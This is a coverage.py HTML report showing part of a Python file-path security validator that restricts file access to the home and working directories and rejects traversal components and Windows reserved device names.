            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">93 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">57<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">36<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_9d0a8317fb892e58_password_manager_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="z_6156a86a215061be___init___py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass Security Validation Module</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">Maps to: Section B2a-B2e Enhanced Security Validation from flowchart</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="com"># A1a: Load System Tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t"><span class="key">import</span> <span class="nam">os</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="key">import</span> <span class="nam">stat</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t9" href="#t9">9</a></span><span class="t"><span class="key">from</span> <span class="nam">pathlib</span> <span class="key">import</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t10" href="#t10">10</a></span><span class="t"><span class="key">from</span> <span class="nam">typing</span> <span class="key">import</span> <span class="nam">Set</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t11" href="#t11">11</a></span><span class="t"><span class="key">import</span> <span class="nam">logging</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t12" href="#t12">12</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t13" href="#t13">13</a></span><span class="t"><span class="key">from</span> <span class="nam">app</span> <span class="key">import</span> <span class="nam">SecurityViolationError</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t14" href="#t14">14</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t15" href="#t15">15</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t16" href="#t16">16</a></span><span class="t"><span class="key">class</span> <span class="nam">SecurityValidator</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t17" href="#t17">17</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t18" href="#t18">18</a></span><span class="t"><span class="str">    Security validation and path checking</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t19" href="#t19">19</a></span><span class="t"><span class="str">    Implements comprehensive security hardening</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t20" href="#t20">20</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t21" href="#t21">21</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t22" href="#t22">22</a></span><span class="t">    <span class="key">def</span> <span class="nam">__init__</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">logger</span><span class="op">:</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">Logger</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t23" href="#t23">23</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span> <span class="op">=</span> <span class="nam">logger</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t24" href="#t24">24</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t25" href="#t25">25</a></span><span class="t">        <span class="com"># B2d: Set Security Boundaries</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t26" href="#t26">26</a></span><span class="t">        <span class="com"># Define which folders the program is allowed to access</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t27" href="#t27">27</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">allowed_directories</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_get_allowed_directories</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t28" href="#t28">28</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t29" href="#t29">29</a></span><span class="t">    <span class="key">def</span> <span class="nam">_get_allowed_directories</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Set</span><span class="op">[</span><span class="nam">Path</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t30" href="#t30">30</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t31" href="#t31">31</a></span><span class="t"><span class="str">        B2d: Set Security Boundaries</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t32" href="#t32">32</a></span><span class="t"><span class="str">        Define allowed security zones for file access</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t33" href="#t33">33</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t34" href="#t34">34</a></span><span class="t">        <span class="nam">allowed</span> <span class="op">=</span> <span class="nam">set</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t35" href="#t35">35</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t36" href="#t36">36</a></span><span class="t">        <span class="com"># User's home directory</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t37" href="#t37">37</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t38" href="#t38">38</a></span><span class="t">            <span class="nam">allowed</span><span class="op">.</span><span class="nam">add</span><span class="op">(</span><span class="nam">Path</span><span class="op">.</span><span class="nam">home</span><span class="op">(</span><span class="op">)</span><span class="op">.</span><span class="nam">resolve</span><span class="op">(</span><span class="op">)</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t39" href="#t39">39</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t40" href="#t40">40</a></span><span class="t">            <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t41" href="#t41">41</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t42" href="#t42">42</a></span><span class="t">        <span class="com"># Current working directory (with explicit allow flag)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t43" href="#t43">43</a></span><span class="t">        <span class="com"># Note: CWD access should require --allow-cwd flag in production</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t44" href="#t44">44</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t45" href="#t45">45</a></span><span class="t">            <span class="nam">allowed</span><span class="op">.</span><span class="nam">add</span><span class="op">(</span><span class="nam">Path</span><span class="op">.</span><span class="nam">cwd</span><span class="op">(</span><span class="op">)</span><span class="op">.</span><span class="nam">resolve</span><span class="op">(</span><span class="op">)</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t46" href="#t46">46</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t47" href="#t47">47</a></span><span class="t">            <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t48" href="#t48">48</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t49" href="#t49">49</a></span><span class="t">        <span class="key">return</span> <span class="nam">allowed</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t50" href="#t50">50</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t51" href="#t51">51</a></span><span class="t">    <span class="key">def</span> <span class="nam">validate_file_path</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Path</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t52" href="#t52">52</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t53" href="#t53">53</a></span><span class="t"><span class="str">        B2a-B2e: Complete path security validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t54" href="#t54">54</a></span><span class="t"><span class="str">        Comprehensive security checks for file paths</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t55" href="#t55">55</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t56" href="#t56">56</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t57" href="#t57">57</a></span><span class="t">        <span class="com"># B2a: Resolve Absolute Paths for Security</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t58" href="#t58">58</a></span><span class="t">        <span class="com"># Use Path.resolve() to get canonical paths</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t59" href="#t59">59</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t60" href="#t60">60</a></span><span class="t">            <span class="nam">resolved_path</span> <span class="op">=</span> <span class="nam">file_path</span><span class="op">.</span><span class="nam">resolve</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t61" href="#t61">61</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t62" href="#t62">62</a></span><span class="t">            <span class="key">raise</span> <span class="nam">SecurityViolationError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Cannot resolve path: </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t63" href="#t63">63</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t64" href="#t64">64</a></span><span class="t">        <span class="com"># B2b: Validate Against Allowed Directories</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t65" href="#t65">65</a></span><span class="t">        <span class="com"># Check if resolved path is within approved locations</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t66" href="#t66">66</a></span><span class="t">        <span class="key">if</span> <span class="key">not</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_is_path_within_allowed_directories</span><span class="op">(</span><span class="nam">resolved_path</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t67" href="#t67">67</a></span><span class="t">            <span class="com"># B2b_Danger: Security Violation Detected</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t68" href="#t68">68</a></span><span class="t">            <span class="key">raise</span> <span class="nam">SecurityViolationError</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t69" href="#t69">69</a></span><span class="t">                <span class="fst">f"</span><span class="fst">File path outside approved security boundaries: </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">"</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t70" href="#t70">70</a></span><span class="t">            <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t71" href="#t71">71</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t72" href="#t72">72</a></span><span class="t">        <span class="com"># B2c: Check Each Path Element</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t73" href="#t73">73</a></span><span class="t">        <span class="com"># Examine every folder and file name in the path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t74" href="#t74">74</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">_validate_path_components</span><span class="op">(</span><span class="nam">resolved_path</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t75" href="#t75">75</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t76" href="#t76">76</a></span><span class="t">        <span class="com"># B2e: Verify File Within Safe Zone</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t77" href="#t77">77</a></span><span class="t">        <span class="com"># Final verification that file is in safe area</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t78" href="#t78">78</a></span><span class="t">        <span class="key">if</span> <span class="key">not</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_is_file_in_safe_zone</span><span class="op">(</span><span class="nam">resolved_path</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t79" href="#t79">79</a></span><span class="t">            <span class="com"># B2e_Security: File Access Blocked</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t80" href="#t80">80</a></span><span class="t">            <span class="key">raise</span> <span class="nam">SecurityViolationError</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t81" href="#t81">81</a></span><span class="t">                <span class="fst">f"</span><span class="fst">File access blocked by security policy: </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">"</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t82" href="#t82">82</a></span><span class="t">            <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t83" href="#t83">83</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t84" href="#t84">84</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Security validation passed: </span><span class="op">{</span><span class="nam">resolved_path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t85" href="#t85">85</a></span><span class="t">        <span class="key">return</span> <span class="nam">resolved_path</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t86" href="#t86">86</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t87" href="#t87">87</a></span><span class="t">    <span class="key">def</span> <span class="nam">_is_path_within_allowed_directories</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">resolved_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="nam">bool</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t88" href="#t88">88</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t89" href="#t89">89</a></span><span class="t"><span class="str">        B2b_Check: Path Within Security Boundaries?</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t90" href="#t90">90</a></span><span class="t"><span class="str">        Check if path is contained within approved locations</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t91" href="#t91">91</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t92" href="#t92">92</a></span><span class="t">        <span class="key">for</span> <span class="nam">allowed_dir</span> <span class="key">in</span> <span class="nam">self</span><span class="op">.</span><span class="nam">allowed_directories</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t93" href="#t93">93</a></span><span class="t">            <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t94" href="#t94">94</a></span><span class="t">                <span class="com"># Use relative_to() to check containment</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t95" href="#t95">95</a></span><span class="t">                <span class="nam">resolved_path</span><span class="op">.</span><span class="nam">relative_to</span><span class="op">(</span><span class="nam">allowed_dir</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t96" href="#t96">96</a></span><span class="t">                <span class="key">return</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t97" href="#t97">97</a></span><span class="t">            <span class="key">except</span> <span class="nam">ValueError</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t98" href="#t98">98</a></span><span class="t">                <span class="com"># Path is not relative to this allowed directory</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t99" href="#t99">99</a></span><span class="t">                <span class="key">continue</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t100" href="#t100">100</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t101" href="#t101">101</a></span><span class="t">        <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t102" href="#t102">102</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t103" href="#t103">103</a></span><span class="t">    <span class="key">def</span> <span class="nam">_validate_path_components</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">resolved_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t104" href="#t104">104</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t105" href="#t105">105</a></span><span class="t"><span class="str">        B2c: Check Each Path Element</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t106" href="#t106">106</a></span><span class="t"><span class="str">        Examine every folder and file name for security violations</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t107" href="#t107">107</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t108" href="#t108">108</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t109" href="#t109">109</a></span><span class="t">        <span class="com"># B2c_Loop: Examine Path Elements One by One</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t110" href="#t110">110</a></span><span class="t">        <span class="key">for</span> <span class="nam">part</span> <span class="key">in</span> <span class="nam">resolved_path</span><span class="op">.</span><span class="nam">parts</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t111" href="#t111">111</a></span><span class="t">            <span class="key">if</span> <span class="key">not</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_is_path_component_safe</span><span class="op">(</span><span class="nam">part</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t112" href="#t112">112</a></span><span class="t">                <span class="com"># B2c_Invalid: Unsafe Path Element Found</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t113" href="#t113">113</a></span><span class="t">                <span class="key">raise</span> <span class="nam">SecurityViolationError</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t114" href="#t114">114</a></span><span class="t">                    <span class="fst">f"</span><span class="fst">Unsafe path component detected: </span><span class="op">{</span><span class="nam">part</span><span class="op">}</span><span class="fst">"</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t115" href="#t115">115</a></span><span class="t">                <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t116" href="#t116">116</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t117" href="#t117">117</a></span><span class="t">    <span class="key">def</span> <span class="nam">_is_path_component_safe</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">component</span><span class="op">:</span> <span class="nam">str</span><span class="op">)</span> <span class="op">-></span> <span class="nam">bool</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t118" href="#t118">118</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t119" href="#t119">119</a></span><span class="t"><span class="str">        B2c_Check: Path Element Safe?</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t120" href="#t120">120</a></span><span class="t"><span class="str">        Check individual path components for safety</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t121" href="#t121">121</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t122" href="#t122">122</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t123" href="#t123">123</a></span><span class="t">        <span class="com"># Skip drive letters on Windows (e.g., "C:", "D:")</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t124" href="#t124">124</a></span><span class="t">        <span class="key">if</span> <span class="nam">len</span><span class="op">(</span><span class="nam">component</span><span class="op">)</span> <span class="op">==</span> <span class="num">2</span> <span class="key">and</span> <span class="nam">component</span><span class="op">[</span><span class="num">1</span><span class="op">]</span> <span class="op">==</span> <span class="str">':'</span> <span class="key">and</span> <span class="nam">component</span><span class="op">[</span><span class="num">0</span><span class="op">]</span><span class="op">.</span><span class="nam">isalpha</span><span class="op">(</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t125" href="#t125">125</a></span><span class="t">            <span class="key">return</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t126" href="#t126">126</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t127" href="#t127">127</a></span><span class="t">        <span class="com"># Skip root directory</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t128" href="#t128">128</a></span><span class="t">        <span class="key">if</span> <span class="nam">component</span> <span class="key">in</span> <span class="op">[</span><span class="str">'/'</span><span class="op">,</span> <span class="str">'\\'</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t129" href="#t129">129</a></span><span class="t">            <span class="key">return</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t130" href="#t130">130</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t131" href="#t131">131</a></span><span class="t">        <span class="com"># Check for dangerous patterns</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t132" href="#t132">132</a></span><span class="t">        <span class="nam">dangerous_patterns</span> <span class="op">=</span> <span class="op">[</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t133" href="#t133">133</a></span><span class="t">            <span class="str">'..'</span><span class="op">,</span> <span class="str">'..'</span><span class="op">,</span>  <span class="com"># Path traversal</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t134" href="#t134">134</a></span><span class="t">            <span class="str">'CON'</span><span class="op">,</span> <span class="str">'PRN'</span><span class="op">,</span> <span class="str">'AUX'</span><span class="op">,</span> <span class="str">'NUL'</span><span class="op">,</span>  <span class="com"># Windows reserved names</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t135" href="#t135">135</a></span><span class="t">            <span class="str">'COM1'</span><span class="op">,</span> <span class="str">'COM2'</span><span class="op">,</span> <span class="str">'COM3'</span><span class="op">,</span> <span class="str">'COM4'</span><span class="op">,</span> <span class="str">'COM5'</span><span class="op">,</span> <span class="str">'COM6'</span><span class="op">,</span> <span class="str">'COM7'</span><span class="op">,</span> <span class="str">'COM8'</span><span class="op">,</span> <span class="str">'COM9'</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t136" href="#t136">136</a></span><span class="t">            <span class="str">'LPT1'</span><span class="op">,</span> <span class="str">'LPT2'</span><span class="op">,</span> <span class="str">'LPT3'</span><span class="op">,</span> <span class="str">'LPT4'</span><span class="op">,</span> <span class="str">'LPT5'</span><span class="op">,</span> <span class="str">'LPT6'</span><span class="op">,</span> <span class="str">'LPT7'</span><span class="op">,</span> <span class="str">'LPT8'</span><span class="op">,</span> <span class="str">'LPT9'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t137" href="#t137">137</a></span><span class="t">        <span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t138" href="#t138">138</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t139" href="#t139">139</a></span><span class="t">        <span class="nam">component_upper</span> <span class="op">=</span> <span class="nam">component</span><span class="op">.</span><span class="nam">upper</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t140" href="#t140">140</a></span><span class="t">        <span class="key">if</span> <span class="nam">component_upper</span> <span class="key">in</span> <span class="nam">dangerous_patterns</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t141" href="#t141">141</a></span><span class="t">            <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t142" href="#t142">142</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
